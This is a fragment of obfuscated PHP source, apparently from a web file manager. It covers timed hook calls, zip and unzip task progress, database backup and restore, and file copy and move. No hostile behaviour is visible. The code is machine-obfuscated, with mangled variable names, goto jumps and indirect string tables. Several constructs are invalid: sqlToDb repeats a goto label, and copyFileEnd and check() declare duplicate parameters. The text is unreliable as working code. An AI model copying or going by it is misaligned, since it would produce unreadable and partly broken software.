return !0; } return !1; } public static function timeLimitCall($C썕, $Fᵚ, $C⏭, $f = 5.0) { goto B؎; B؎: $b =& $_SERVER[̉]; if (!$C썕 || !$Fᵚ) { return; } self::$asyncAdd = !0; goto b; b䶑: Cache::set($fݿ⏆, $D錤, 60); Cache::removeMemory($fݿ⏆); write_log($b[1609] . $C썕 . $b[68] . $Fᵚ, $b[1603]); goto d􉗧; b: $fݿ⏆ = $b[1606]; $D錤 = Cache::get($fݿ⏆, !0); $D٠ = array($b[1607] => timeFloat(), $b[1608] => timeFloat(), $b[262] => $Fᵚ, $b[1601] => $C⏭, $b[197] => $f); goto F; F: if (is_array($D錤[$C썕])) { $D٠[$b[1608]] = $D錤[$C썕][$b[1608]]; } if (is_array($D錤[$C썕])) { if (timeFloat() - $D錤[$C썕][$b[1607]] < $D٠[$b[197]] * 0.3) { return; } $D٠[$b[1608]] = $D錤[$C썕][$b[1608]]; } $D錤[$C썕] = $D٠; goto b䶑; d􉗧: } public static function timeLimitCallLoop() { goto DŘ; b: if (!$d䒂) { return Cache::remove($b); } Cache::set($b, $d䒂, 60); Cache::removeMemory($b); goto Eۂ; DԆׯ: $d䒂 = array(); foreach ($fÉ as $fٞ => $c񂅿) { if ($aܦ - $c񂅿[$B[1608]] > $c񂅿[$B[197]]) { $Dᰫ = !0; try { Hook::apply($c񂅿[$B[262]], $c񂅿[$B[1601]]); write_log($B[1611] . $fٞ . $B[68] . $c񂅿[$B[262]] . $B[1612] . ACTION, $B[1603]); } catch (Exception $Eݣ) { } continue; } $d䒂[$fٞ] = $c񂅿; } if (!$Dᰫ) { return; } goto b; DŘ: $B =& $_SERVER[̉]; $e楽 = array($B[1610]); $Bټ = in_array(strtolower(ACTION), $e楽); goto d; d: if (!$Bټ && !self::$asyncAdd) { return; } $b = $B[1606]; $fÉ = Cache::get($b, !0); goto a; a: if (!$fÉ || count($fÉ) <= 0) { return; } $Dᰫ = !1; $aܦ = timeFloat(); goto DԆׯ; Eۂ: } public static function finished($ǎɆ, $eٹ˧) { $Aˍ =& $_SERVER[̉]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($Aˍ[262] => $ǎɆ, $Aˍ[1601] => $eٹ˧); } private static function finishedRun() { $Eݏ =& $_SERVER[̉]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $eі) { try { Hook::apply($eі[$Eݏ[262]], $eі[$Eݏ[1601]]); } catch (Exception $fҶ̊) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto A׋; A׋: $C =& $_SERVER[̉]; parent::startAfter(); Hook::bind($C[1613], array($this, $C[1614])); goto cͣ; A: if (!$Eҋ̃[$C[1435]]) { $Eҋ̃[$C[1435]] = LNG($C[1617]); } goto e蚳; cͣ: Hook::bind($C[1088], array($this, $C[1615])); $Eҋ̃ =& $this->task; $Eҋ̃[$C[1616]] = $C[1093]; goto A; e蚳: } protected function endAfter() { $d߆ =& $_SERVER[̉]; parent::endAfter(); Hook::unbind($d߆[1613], array($this, $d߆[1614])); Hook::unbind($d߆[1088], array($this, $d߆[1615])); } public function updateAfter() { $A =& $_SERVER[̉]; $d =& $this->task; if (!$d[$A[1020]] || !$d[$A[726]]) { return; } if ($d[$A[1616]] == $A[1093]) { $e = 0; if ($d[$A[1575]]) { $e = $d[$A[1576]] / $d[$A[1575]]; } $d[$A[1532]] = $e * 0.3; } else { if ($d[$A[1616]] == $A[311]) { $e = $d[$A[1035]] / $d[$A[1020]]; $d[$A[1532]] = 0.3 + $e * 0.4; } else { if ($d[$A[1616]] == $A[107]) { $Fت = 0; if ($d[$A[1577]] == $A[107]) { $Fت = $d[$A[1576]]; } $e = ($d[$A[1580]] + $Fت) / $d[$A[726]]; $d[$A[1532]] = 0.3 + 0.4 + $e * 0.3; } } } if ($d[$A[1532]] > 0) { $BǾҢ = timeFloat() - $d[$A[752]] - $d[$A[1535]]; $d[$A[1536]] = $BǾҢ * (1 - $d[$A[1532]]) / $d[$A[1532]]; } } public function addFile($a귤) { goto Fҍ; a̠: $this->update(); goto aϳى; aߵ: $Aը[$F[1022]] = $F[1592]; $Aը[$F[1577]] = $F[1093]; $Aը[$F[726]] = $B﹈߷[$F[78]]; goto Aƍڂȟ; Fҍ: $F =& $_SERVER[̉]; $Aը =& $this->task; $B﹈߷ = IO::info($a귤); goto eȮµ; eȮµ: $Aը[$F[1573]] = $B﹈߷[$F[28]]; $Aը[$F[1575]] = $B﹈߷[$F[78]]; $Aը[$F[1576]] = 0; goto aߵ; Aƍڂȟ: $Aը[$F[1020]] = 1; $aá = 0; $Aը[$F[1584]] = array($F[1585] => $aá + 1, $F[413] => $B﹈߷[$F[28]], $F[76] => $B﹈߷[$F[76]], $F[495] => $B﹈߷[$F[495]] ? $B﹈߷[$F[495]] : $B﹈߷[$F[76]]); goto a̠; aϳى: } public function unzipAfter($CƲ϶) { goto e; e: $cӓ =& $_SERVER[̉]; $B٧⭄ =& $this->task; $B٧⭄[$cӓ[1616]] = $cӓ[107]; goto a; Bɿ: if ($c֋ɝ[$cӓ[29]] == $cӓ[193]) { $B٧⭄[$cӓ[1020]] = 1; } else { $B٧⭄[$cӓ[1020]] = $c֋ɝ[$cӓ[81]][$cӓ[79]]; } $B٧⭄[$cӓ[1022]] = $cӓ[33]; $B٧⭄[$cӓ[1577]] = 0; goto CϏ܋; f: $B٧⭄[$cӓ[1573]] = $cӓ[33]; $B٧⭄[$cӓ[1580]] = 0; $B٧⭄[$cӓ[726]] = $c֋ɝ[$cӓ[78]]; goto Eʵ; CϏ܋: $B٧⭄[$cӓ[1035]] = 0; $B٧⭄[$cӓ[1575]] = 0; $B٧⭄[$cӓ[1576]] = 0; goto f; a: $c֋ɝ = IO::infoWithChildren($CƲ϶); $fلȷ = 0; $B٧⭄[$cӓ[1584]] = array($cӓ[1585] => $fلȷ + 1, $cӓ[413] => $c֋ɝ[$cӓ[28]], $cӓ[76] => $c֋ɝ[$cӓ[76]], $cӓ[495] => $c֋ɝ[$cӓ[495]] ? $c֋ɝ[$cӓ[495]] : $c֋ɝ[$cӓ[76]]); goto Bɿ; Eʵ: $this->update(); self::log($cӓ[1618] . json_encode(array($B٧⭄, $c֋ɝ))); goto Cޝ͗; Cޝ͗: } public function nameParse($eݼƷ) { goto d; d: $aΎ =& $_SERVER[̉]; $Dح̾ =& $this->task; if ($Dح̾[$aΎ[1616]] == $aΎ[1093]) { $Dح̾[$aΎ[1616]] = $aΎ[311]; $Dح̾[$aΎ[1580]] = 0; $Dح̾[$aΎ[726]] = 0; } goto E; E: $aڢٶ = get_path_this($eݼƷ); if (strstr($aڢٶ, $aΎ[95])) { $Dح̾[$aΎ[1035]] += 1; $Dح̾[$aΎ[1020]] += 1; } $Dح̾[$aΎ[1573]] = $eݼƷ; goto a; a: $this->update(); goto E斏; E斏: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $bӇ =& $_SERVER[̉]; parent::startAfter(); Hook::bind($bӇ[1619], array($this, $bӇ[1614])); $b =& $this->task; $b[$bӇ[1616]] = $bӇ[1093]; if (!$b[$bӇ[1435]]) { $b[$bӇ[1435]] = LNG($bӇ[1620]); } } protected function endAfter() { $bޠ =& $_SERVER[̉]; parent::endAfter(); Hook::unbind($bޠ[1619], array($this, $bޠ[1614])); } public function updateAfter() { $D =& $_SERVER[̉]; $eĂ =& $this->task; if (!$eĂ[$D[1020]] || !$eĂ[$D[726]]) { return; } if ($eĂ[$D[1616]] == $D[1093]) { $cⶥ = $eĂ[$D[1576]]; if ($eĂ[$D[1577]] != $D[1093]) { $cⶥ = 0; } $cϖ = ($eĂ[$D[1580]] + $cⶥ) / $eĂ[$D[726]]; $eĂ[$D[1532]] = $cϖ * 0.3; } else { if ($eĂ[$D[1616]] == $D[311]) { $cϖ = $eĂ[$D[1035]] / $eĂ[$D[1020]]; $eĂ[$D[1532]] = 0.3 + $cϖ * 0.5; } else { if ($eĂ[$D[1616]] == $D[107]) { $cϖ = 0; if ($eĂ[$D[1575]]) { $cϖ = $eĂ[$D[1576]] / $eĂ[$D[1575]]; } $eĂ[$D[1532]] = 0.3 + 0.5 + $cϖ * 0.2; } } } if ($eĂ[$D[1532]] > 0) { $aȞ = timeFloat() - $eĂ[$D[752]] - $eĂ[$D[1535]]; $eĂ[$D[1536]] = $aȞ * (1 - $eĂ[$D[1532]]) / $eĂ[$D[1532]]; } } public function copyFileStart($bͥۯ, $eα, $B܇, $E۽, $d斤, $aݞ) { $f׿ԃ =& $_SERVER[̉]; parent::copyFileStart($bͥۯ, $eα, $B܇, $E۽, $d斤, $aݞ); $eꇵ =& $this->task; if ($eꇵ[$f׿ԃ[1616]] == $f׿ԃ[311]) { $eꇵ[$f׿ԃ[1616]] = $f׿ԃ[107]; } $this->update(); } public function copyFileEnd($B, $B, $Dե, $D۳, $f׸, $D҂) { $d =& $_SERVER[̉]; $aׇ =& $this->task; $aׇ[$d[1576]] = $aׇ[$d[1575]]; $aׇ[$d[1580]] += $aׇ[$d[1575]]; $aׇ[$d[1577]] = $d[33]; $this->update(); } public function nameParse($eÒ) { $d =& $_SERVER[̉]; $CǄ =& $this->task; if ($CǄ[$d[1035]] < $CǄ[$d[1020]]) { $A؋ = get_path_this($eÒ); if (strstr($A؋, $d[95])) { $CǄ[$d[1035]] += 1; } } if ($CǄ[$d[1616]] == $d[1093]) { $CǄ[$d[1616]] = $d[311]; } $CǄ[$d[1573]] = $eÒ; $this->update(); } } goto a֊; CŃ͘Ш: class DbManage { function __construct($a㌐, $aܬ = '') { $this->database = $a㌐; $this->type = $aܬ; } public function model($dˠ = '') { return new ModelBase($dˠ, $_SERVER[̉][33], $this->database); } public function db($EťŐ = false) { goto bݧ; Dյ: $this->database = $cҦ; $c˕->execute("\x75\x73\x65\x20\140{$f}\x60"); return $c˕; goto BӅ; CԇϢ: if (!$C׵) { $c˕->execute("\143\162\145\x61\x74\145\x20\x64\x61\x74\141\142\141\163\x65\40\x60{$f}\140"); } $cҦ[$D[928]] = $f; if ($cҦ[$D[757]] == $D[758]) { $cҦ[$D[759]] .= $D[1016] . $f; } goto Dյ; dݖŲ: $f = $cҦ[$D[928]]; $cҦ[$D[928]] = $D[33]; if ($cҦ[$D[757]] == $D[758]) { $Dݟ = $cҦ[$D[759]]; $cҦ[$D[759]] = substr($Dݟ, 0, strrpos($Dݟ, $D[1016])); } goto b̶; b̶: $this->database = $cҦ; $c˕ = $this->model()->db(); try { $C׵ = $c˕->execute("\x73\150\157\167\x20\x64\141\x74\141\142\x61\x73\145\163\40\154\x69\x6b\145\x20\47{$f}\47"); } catch (Exception $dͥ) { } goto CԇϢ; bݧ: $D =& $_SERVER[̉]; $cҦ = array_change_key_case($this->database); if ($this->type == $D[9] || !$EťŐ) { return $this->model()->db(); } goto dݖŲ; BӅ: } public function createTable($Aʰւƈ, $D܊ = null) { $F =& $_SERVER[̉]; if (!IO::exist($Aʰւƈ)) { ActionCall($F[1017], !0, 0); show_json(LNG($F[1018]), !1); } $C = sqlSplit(IO::getContent($Aʰւƈ)); foreach ($C as $aݳ) { if ($D܊) { $Cӫ = stripos($aݳ, $F[1019]) === 0; if ($Cӫ) { $D܊->task[$F[1020]] += 1; } } $this->model()->db()->execute($aݳ); if ($D܊ && $Cӫ) { preg_match($F[1021], $aݳ, $Cև); $D܊->task[$F[1022]] = $Cև[1]; $D܊->update(1); } } $this->taskToCache($D܊); } public function insertTable($d, $f̮ = null) { $f՛Ք =& $_SERVER[̉]; $f֧ = $this->model()->db(); $c = $a߰ ? array($a߰) : $f֧->getTables(); foreach ($d as $F) { $a߰ = basename($F, $f՛Ք[749]); if (!in_array($a߰, $c)) { continue; } if ($f̮) { $f̮->task[$f՛Ք[1022]] = $a߰; } if (get_filesize($F) == 0) { continue; } $Dۋξ = $this->sqlToDb($F, $f̮); if (!$Dۋξ) { ActionCall($f՛Ք[1017], !0, 0); show_json(LNG($f՛Ք[1023]) . "\133{$a߰}\135", !1); } } $this->taskToCache($f̮); } public function sqlFromDb($AӤɣ, $aӗ, $b = null, $F = null) { goto cם㭕; BѼ: $a = 0; $eҪ = 10000; $C = fopen($aӗ, $_SERVER[̉][1024]); goto Fړ; C񏐡: fclose($C); return $cЪ¨; goto a˓; cם㭕: if ($b) { $b->task[$_SERVER[̉][1022]] = $AӤɣ; } $c¡ͨ = $this->model($AӤɣ); $cЪ¨ = 0; goto BѼ; Fړ: $ażν = $c¡ͨ->getPk(); $d߆ = $c¡ͨ->getDbFields(); do { $cѷ΃ = array($ażν => array($_SERVER[̉][970], $a)); $e = $c¡ͨ->where($cѷ΃)->field($d߆)->order($ażν . $_SERVER[̉][1025])->limit($eҪ)->select(); $e = !empty($e) ? $e : array(); if (!($Dϐ = count($e))) { break; } $aӤン = end($e); $a = $aӤン[$ażν]; $D = array(); foreach ($e as $Aޱ) { if ($AӤɣ == $_SERVER[̉][1026] && $Aޱ[$_SERVER[̉][29]] == $_SERVER[̉][1027]) { $eѱ = json_decode($Aޱ[$_SERVER[̉][372]], !0); if ($eѱ[$_SERVER[̉][28]] == date($_SERVER[̉][714]) && !$eѱ[$_SERVER[̉][713]]) { continue; } } if ($F) { $Aޱ[$_SERVER[̉][76]] = "\173\x69\157\72{$F}\x7d" . substr($Aޱ[$_SERVER[̉][76]], strlen("\x7b\151\157\72{$Aޱ[$_SERVER[̉][785]]}\x7d")); $Aޱ[$_SERVER[̉][785]] = $F; } $D[] = $_SERVER[̉][1028] . $this->sqlEncode($Aޱ) . $_SERVER[̉][1029]; } $B¦ľ = "\111\116\x53\x45\x52\x54\40\x49\116\x54\x4f\40\x60{$AӤɣ}\140\40\x28\x60" . implode($_SERVER[̉][1030], $d߆) . $_SERVER[̉][1031]; fwrite($C, $B¦ľ . implode($_SERVER[̉][1032], $D) . $_SERVER[̉][68] . PHP_EOL); $cЪ¨ += $Dϐ; if ($b) { $b->update($Dϐ); } } while ($eҪ == $Dϐ); goto C񏐡; a˓: } public function sqlToDb($b̾, $bօ = null) { goto E; F: if (!empty($cĤߠ)) { $f = $FК . implode($Ḋ[47], $cĤߠ); if (!$CͰۆ->execute($f)) { return !1; } if ($bօ) { $bօ->update($C莗); } } return !0; goto c; C: $cĤߠ = array(); $D钩 = $this->type == $Ḋ[9] ? 500 : 2000; $e = basename($b̾, $Ḋ[749]); goto f; E: if (!$f𙅇) { return !1; } $C莗 = 0; $FК = $Ḋ[33]; goto C; E: $Ḋ =& $_SERVER[̉]; $CͰۆ = $this->model()->db(); $f𙅇 = @fopen($b̾, $Ḋ[1033]); goto E; f: if ($e == $Ḋ[1034]) { $D钩 = 50; } while (!feof($f𙅇)) { $Aɴ = trim(fgets($f𙅇)); if (!$Aɴ) { continue; } $f = $this->sqlDecode($Aɴ, $this->type); if (stripos($f, $Ḋ[355]) === 0) { if (!$FК) { $FК = $f . $Ḋ[50]; } continue; } if ($bօ) { $bօ->task[$Ḋ[1020]] += 1; } $C莗++; $cĤߠ[] = rtrim(rtrim(trim($f), $Ḋ[47]), $Ḋ[68]); if ($C莗 >= $D钩) { $f = $FК . implode($Ḋ[47], $cĤߠ); if (!$CͰۆ->execute($f)) { return !1; } if ($bօ) { $bօ->update($C莗); } $cĤߠ = array(); $C莗 = 0; } } fclose($f𙅇); goto F; c: } public function dropTable($bÃ = null) { $cș = $this->model()->db(); $f݆ = $bÃ ? array($bÃ) : $cș->getTables(); if (!$f݆) { return; } foreach ($f݆ as $bÃ) { $cș->execute("\144\162\x6f\160\x20\164\x61\142\154\x65\40\x69\x66\40\x65\170\x69\x73\x74\x73\x20\x60{$bÃ}\x60"); } } private function taskToCache($a = null) { $DƮ =& $_SERVER[̉]; if (!$a) { return; } $bӹ = array($DƮ[1022] => $a->task[$DƮ[1022]], $DƮ[1020] => $a->task[$DƮ[1020]], $DƮ[1035] => $a->task[$DƮ[1035]]); if ($bӹ[$DƮ[1020]] == $bӹ[$DƮ[1035]]) { $bӹ[$DƮ[723]] = 1; } Cache::set($DƮ[1036] . $a->task[$DƮ[393]], $bӹ); $a->end(); } private function sqlEncode($d輊) { $fӘ樒 =& $_SERVER[̉]; $eֹģ = array(); foreach ($d輊 as $Dγ) { if (is_array($Dγ)) { $Dγ = json_encode_force($Dγ); } $Dγ = addslashes($Dγ); $Dγ = str_replace(array($fӘ樒[1037], $fӘ樒[229]), array($fӘ樒[1038], $fӘ樒[1039]), $Dγ); $eֹģ[] = str_replace($fӘ樒[55], $fӘ樒[1040], $Dγ); } return $fӘ樒[55] . implode($fӘ樒[1041], $eֹģ) . $fӘ樒[55]; } private function sqlDecode($dͮ, $B) { $Aܐ =& $_SERVER[̉]; $dͮ = str_replace(array($Aܐ[1038], $Aܐ[1039]), array($Aܐ[1037], $Aܐ[229]), $dͮ); if ($B == $Aܐ[9]) { $dͮ = stripslashes($dͮ); } return $dͮ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($f✜, $D׌) { goto d; d: $cԄ =& $_SERVER[̉]; $c = $D׌; $GLOBALS[$cԄ[1042]] = $cԄ[1043] . $f✜; goto aቔ̃; aቔ̃: Hook::trigger($cԄ[1043] . $f✜ . $cԄ[1044], $c); $F = self::driverMake($D׌[0]); if (method_exists($F, $f✜)) { $B = @call_user_func_array(array($F, $f✜), $D׌); } else { if (method_exists($F, $cԄ[1045])) { $B = @call_user_func_array(array($F, $f✜), $D׌); } else { if (method_exists(self, $f✜)) { $B = @call_user_func_array(array(self, $f✜), $D׌); } else { $B = call_user_func_array(array(parent, $f✜), $D׌); } } } goto bዽ; bዽ: Hook::trigger($cԄ[1043] . $f✜ . $cԄ[1046], $c, $B); return $B; goto fƶ; fƶ: } public static function init($a楡) { return self::driverMake($a楡); } public static function copy($Eӈԡ, $BҜ, $bه = false, $d獓 = false) { return self::copyMoveStart($Eӈԡ, $BҜ, $bه, $_SERVER[̉][518], $d獓); } public static function move($Eؘ, $Dя, $Fƕ = false, $D = false) { return self::copyMoveStart($Eؘ, $Dя, $Fƕ, $_SERVER[̉][520], $D); } private static function copyMoveStart($a, $Bܔ, $b҇˓, $Dн, $Fߜ؊) { $e˩ =& $_SERVER[̉]; $e鑊 = array($a, $Bܔ, $b҇˓, $Fߜ؊); Hook::trigger($e˩[1043] . $Dн . $e˩[1044], $e鑊); $aݐ = self::copyMove($a, $Bܔ, $b҇˓, $Dн, $Fߜ؊); Hook::trigger($e˩[1043] . $Dн . $e˩[1046], $e鑊, $aݐ); return $aݐ; } public static function saveFile($f, $bм, $Bުᐈ = true) { goto b; b˙: $f = self::driverMake($bм); $FԼ = !1; if ($f->pathParse[$a癘[1047]]) { $a蘿 = $f->pathParse[$a癘[1047]]; $FԼ = $f; $f = self::driverMake($a蘿); } goto Bؖħ; b: $a癘 =& $_SERVER[̉]; $A = self::info($bм); $fɫ = self::driverMake($f); goto b˙; bެ: $E = self::copyFile($fɫ, $f, $f, $d, $A[$a癘[28]], $Fʎ); if ($FԼ) { $E = $FԼ->getPathOuter($E); } return $E; goto FЖ; Bؖħ: $d = $f->pathFather($bм); $Fʎ = !0; if (!$Bުᐈ && self::driverIsSame($fɫ, $f)) { $Fʎ = !1; } goto bެ; FЖ: } private static function copyMove($C, $B, $d͋, $f, $cВ = false) { goto a; Eѐ߂: $aݳ叼 = self::driverMake($C); $BѨ = self::driverMake($B); $E = $f == $d횈[520]; goto B; bͪ: $F = $aݳ叼->isFile($C); if (!$F && $BѨ->getType() == $d횈[721] && $aݳ叼->getType() == $d횈[106]) { $Eľ = $BѨ->copyFolderFromIO($aݳ叼, $C, $B, $d͋, $E, $cВ); } else { $Eľ = self::copyPath($aݳ叼, $C, $BѨ, $B, $d͋, $E, $F, $cВ); } if ($Eľ && $E) { $aݳ叼->remove($C); } goto F; dؿ: Hook::trigger($d횈[73], $aݳ叼, $C, $BѨ, $B); $cӾ = self::driverIsSame($aݳ叼, $BѨ); if ($cӾ) { if ($f == $d횈[520] && !method_exists($BѨ, $d횈[1048]) && trim($B, $d횈[8]) == trim($BѨ->pathFather($C), $d횈[8])) { if ($aݳ叼->pathThis($C) != $cВ && !$aݳ叼->isTypeObject()) { return $aݳ叼->rename($C, $cВ); } return $BѨ->getPathOuter($C); } if (method_exists($BѨ, $f)) { return $BѨ->{$f}($C, $B, $d͋); } } goto bͪ; B: $C欖 = !1; if ($BѨ->pathParse[$d횈[1047]]) { $B = $BѨ->pathParse[$d횈[1047]]; $C欖 = $BѨ; $BѨ = self::driverMake($B); } self::check($aݳ叼, $C, $BѨ, $B); goto dؿ; F: if ($C欖) { $Eľ = $C欖->getPathOuter($Eľ); } return $Eľ; goto d; a: $d횈 =& $_SERVER[̉]; if (!$C || $C == $d횈[8] || !$B) { return !1; } ignore_timeout(); goto Eѐ߂; d: } private static function check($b, $CՒ, $D, &$D) { $BӺ =& $_SERVER[̉]; if (self::driverIsSame($b, $D) && $b->isFolder($CՒ) && $b->isParentOf($CՒ, $D)) { show_json(LNG($BӺ[1049]), !1); } if (!$b->exist($CՒ)) { show_json(LNG($BӺ[105]), !1); } } private static function copyPath($fĲ, $A, $Cʓ, $Fٿњ, $e秄޼, $Cӡĵ, $fң, $FŒ = false) { goto Bښݘ; Fܝ: $C = is_array($C) ? $C : array($b섺[74] => array(), $b섺[75] => array()); $d暈 = array_merge($C[$b섺[74]], $C[$b섺[75]]); foreach ($d暈 as $eդ) { $bㆽ = $eդ[$b섺[29]] == $b섺[193]; $A = $fĲ->getPathInner($eդ[$b섺[76]]); $A = self::copyPath($fĲ, $A, $Cʓ, $Fٿњ, $e秄޼, $Cӡĵ, $bㆽ); if (!$A) { IO::errorTips($b섺[1050] . $A . $b섺[67] . $Fٿњ); } } goto c; Bښݘ: $b섺 =& $_SERVER[̉]; $Fμ = empty($FŒ) && $FŒ !== $b섺[191] ? $fĲ->pathThis($A) : $FŒ; if ($e秄޼) { $bΦ = $Cʓ->fileNameExist($Fٿњ, $Fμ); $Fμ = $Cʓ->fileNameAuto($Fٿњ, $Fμ, $e秄޼, !$fң); $e秄޼ = $bΦ ? $e秄޼ : !1; } goto F܊³; F܊³: if ($fң) { return self::copyFile($fĲ, $A, $Cʓ, $Fٿњ, $Fμ, $Cӡĵ); } if ($e秄޼ == REPEAT_RENAME_FOLDER) { $e秄޼ = !1; } $aȡíۨ = rtrim($Fٿњ, $b섺[8]) . $b섺[8] . $Fμ; goto eѼ; eѼ: $D = $Cʓ->mkdir($Cʓ->getPath($aȡíۨ)); $Fٿњ = $Cʓ->getPathInner($D); $C = $fĲ->listPath($A, !0); goto Fܝ; c: self::copyMoveKeepInfo($fĲ, $A, $D); return $D; goto Cͷ; Cͷ: } private static function copyFile($A, $dս, $dΖƉ, $D, $eهɥ, $A笋) { goto A; c: Hook::trigger($F͊[1052], $A, $dս, $dΖƉ, $D, $eهɥ, $Aޓ); if (self::driverIsSame($A, $dΖƉ)) { if ($A笋) { $f䏃 = $dΖƉ->moveFile($dս, $D); } else { $f䏃 = $dΖƉ->copyFile($dս, $D); } Hook::trigger($F͊[1053], $A, $dս, $dΖƉ, $D, $eهɥ, $f䏃); self::copyMoveKeepInfo($A, $dս, $f䏃); return $f䏃; } $aّŸ = TEMP_FILES; goto Cϕί; B: mk_dir($Cď); $eܘ = $Cď . $Aޓ; $fњ = $eܘ; goto eǆƅ; A: $F͊ =& $_SERVER[̉]; $D = $dΖƉ->getPath(rtrim($D, $F͊[8]) . $F͊[8] . $eهɥ); $Aޓ = $F͊[1051] . time() . rand_string(5); goto c; Cϕί: if ($GLOBALS[$F͊[6]][$F͊[88]][$F͊[763]]) { $aّŸ = $GLOBALS[$F͊[6]][$F͊[88]][$F͊[763]]; } $A笋 = !0; $Cď = $aّŸ; goto B; fܘ: self::remove($fњ); Hook::trigger($F͊[1053], $A, $dս, $dΖƉ, $D, $eهɥ, $f䏃); self::copyMoveKeepInfo($A, $dս, $f䏃); goto C; eǆƅ: $eܘ = $A->download($dս, $eܘ); $eܘ = $A->iconvApp($eܘ); $f䏃 = $dΖƉ->upload($D, $eܘ, $A笋); goto fܘ; C: return $f䏃; goto B߲; B߲: } private static function copyMoveKeepInfo($B, $e, $Dޞҫ) { if (!$Dޞҫ) { return; } $bߟ = $B->info($e); if (!is_array($bߟ)) { return; } IO::setModifyTime($Dޞҫ, $bߟ[$_SERVER[̉][84]]); } public static function pathFather($AѬ) { $aȶ҂ = IO::init($AѬ); $F۞ = $aȶ҂->pathFather($aȶ҂->path); return $aȶ҂->getPathOuter($F۞); } public static function fileOut($Cˣ, $bΐ = false, $C = false, $d󃦆ܠ = '') { $aʶ = self::driverMake($Cˣ); if ($aʶ->isFileOutServer()) { return $aʶ->fileOutServer($Cˣ, $bΐ, $C, $d󃦆ܠ); } return $aʶ->fileOut($Cˣ, $bΐ, $C, $d󃦆ܠ); } public static function fileOutImage($C坆, $c = 250) { $bأ = array(250, 600, 1200, 3000, 5000); for ($cǊ = 0; $cǊ < count($bأ); $cǊ++) { if ($cǊ == 0 && $c <= $bأ[$cǊ]) { $c = $bأ[$cǊ]; break; } else { if ($c > $bأ[$cǊ - 1] && $c <= $bأ[$cǊ]) { $c = $bأ[$cǊ]; break; } else { if ($cǊ == count($bأ) - 1 && $c > $bأ[$cǊ]) { $c = $bأ[$cǊ]; break; } } } } $B = self::driverMake($C坆); if ($B->isFileOutServer()) { return $B->fileOutImageServer($C坆, $c); } return $B->fileOutImage($C坆, $c); } private static function driverIsSame($bɑ, $CО) { goto F; aˇ: if ($CɃ != $f޳) { return !1; } if ($CɃ == $a񈨔[721]) { return !0; } if ($CɃ == $a񈨔[106]) { return !0; } goto C; C: if ($bɑ->pathDriver == $CО->pathDriver) { return !0; } return !1; goto d; F: $a񈨔 =& $_SERVER[̉]; $CɃ = $bɑ->getType(); $f޳ = $CО->getType(); goto aˇ; d: } public static function copyUpdate($aɯϏ, $D߻) { goto a; eŚȮ: $cڽ = self::_listAll($aɯϏ); $dꡭ = self::_listAll($D߻); $Bޥ = array(); goto Fԩ; a: $b =& $_SERVER[̉]; if (!IO::exist($aɯϏ)) { return !1; } if (!IO::exist($D߻)) { IO::mkdir($D߻); } goto eŚȮ; Fԩ: $e = array(); foreach ($cڽ as $Cō => $e囈ų) { if (isset($dꡭ[$Cō])) { if ($e囈ų[$b[77]] == 1) { continue; } if ($dꡭ[$Cō][$b[78]] == $e囈ų[$b[78]]) { continue; } } if ($e囈ų[$b[77]] == 1) { $e[] = $D߻ . $b[8] . $Cō; continue; } $D = strstr(trim($Cō, $b[8]), $b[8]) ? get_path_father($Cō) : $b[33]; $Bޥ[] = array($b[1054] => $e囈ų[$b[76]], $b[1055] => rtrim($D߻, $b[8]) . $b[8] . $D, $b[1056] => $e囈ų); } $Aݲ = array($b[193] => $Bޥ, $b[77] => $e); goto eѵ; eѵ: Hook::trigger($b[1057], $aɯϏ, $D߻, $Aݲ); foreach ($e as $e囈ų) { IO::mkdir($e囈ų); } foreach ($Bޥ as $e囈ų) { IO::copy($e囈ų[$b[1054]], $e囈ų[$b[1055]], REPEAT_REPLACE); } goto C; C: } private static function _listAll($BԶ) { $e =& $_SERVER[̉]; $BԶ = KodIO::clear($BԶ); $EʬЩ = IO::listAll($BԶ); foreach ($EʬЩ as &$B식) { $Dօ = substr($B식[$e[76]], strlen($BԶ)); $B식[$e[1058]] = trim($Dօ, $e[8]); } unset($B식); return array_to_keyvalue($EʬЩ, $e[1058]); } public static function fileSubstr($C􋌍, $EݺŜ, $fƅ = false) { goto Aшޕ; F͠Ӗ: if ($fƅ <= 0) { return $eچ[33]; } if ($EݺŜ < 0 || $EݺŜ >= $B򛊝 || $fƅ > 1024 * 1024 * 5) { throw new Exception("\146\151\154\x65\122\x65\141\144\x20\145\x72\x72\x6f\162\x21\40\x73\x74\141\162\164\x3d{$EݺŜ}\x3b\x6c\x65\x6e\x67\164\150\x3d{$fƅ}\x3b\40\x73\x69\x7a\145\75{$B򛊝}\73"); } $dޒΰ = $B߻->fileSubstr($C􋌍, $EݺŜ, $fƅ); goto b؄; c: if ($fƅ === !1) { $fƅ = $B򛊝 - $EݺŜ; } if ($EݺŜ + $fƅ > $B򛊝) { $fƅ = $B򛊝 - $EݺŜ; } if (!$B򛊝 && $B߻->getType() == $eچ[106] && !$B߻->exist($C􋌍)) { throw new Exception($eچ[1059] . LNG($eچ[1060]) . $eچ[923] . get_path_this($C􋌍) . $eچ[33]); } goto F͠Ӗ; b؄: if (!$dޒΰ && $fƅ && isset($GLOBALS[$eچ[1061]])) { throw new Exception($GLOBALS[$eچ[1061]][$eچ[1062]]); } return $dޒΰ; goto C匟; Cٍ: $Eީ = $EݺŜ; $Cڏ = $fƅ; if ($EݺŜ < 0) { $EݺŜ = $B򛊝 + $EݺŜ; } goto c; Aшޕ: $eچ =& $_SERVER[̉]; $B߻ = self::driverMake($C􋌍); $B򛊝 = $B߻->size($C􋌍); goto Cٍ; C匟: } private static function driverMake(&$bɂ) { goto fֽï; Aӏ: return $d; goto F; fֽï: $dنۊ =& $_SERVER[̉]; $bႆñ = KodIO::parse($bɂ); if (!self::$driverListSystem) { $B = Model($dنۊ[730])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($B, $dنۊ[393]); } goto cݴ; cݴ: if ($bႆñ[$dنۊ[29]] == KodIO::KOD_IO && !self::$driverListSystem[$bႆñ[$dنۊ[393]]]) { return !1; } $bɂ = $bႆñ[$dنۊ[1063]]; $d = self::driverGet($bႆñ, $bɂ); goto Aӏ; F: } private static function driverGet($b᲎, &$DƇ) { goto eʹ; e؃: switch ($b᲎[$e͐έ[29]]) { case KodIO::KOD_IO: $D憫ą = self::$driverListSystem[$a͌Ռ]; break; case 